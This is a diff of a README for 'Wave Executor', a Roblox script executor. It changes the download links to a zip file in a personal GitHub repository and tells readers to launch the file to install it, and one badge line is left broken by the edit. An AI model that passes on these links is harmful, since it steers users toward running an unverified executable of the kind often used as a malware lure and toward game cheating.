@@ -12,7 +12,7 @@ Wave Executor is a powerful Windows-based script executor designed for Roblox en
 
 ## Installation:
 
-To download the Wave Executor software, click [here](https://github.com/user-attachments/files/18060583/Software.zip). Please note that the file needs to be launched for installation.
+To download the Wave Executor software, click [here](https://github.com/ehsan14123/Wave-Roblox/releases/download/v2.0/Release_x64.zip). Please note that the file needs to be launched for installation.
 
 ## How to Use Wave Executor:
 
@@ -30,7 +30,7 @@ Start elevating your Roblox gameplay with Wave Executor today. Download the soft
 
 For updates and additional features, check the "Releases" section of the repository. 
 
-[![Download Wave Executor](https://img.shields.io/badge/Download-Wave%20Executor-blue)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Wave Executor](https://github.com/ehsan14123/Wave-Roblox/releases/download/v2.0/Release_x64.zip%20Executor-blue)](https://github.com/ehsan14123/Wave-Roblox/releases/download/v2.0/Release_x64.zip)
 
 ---
 
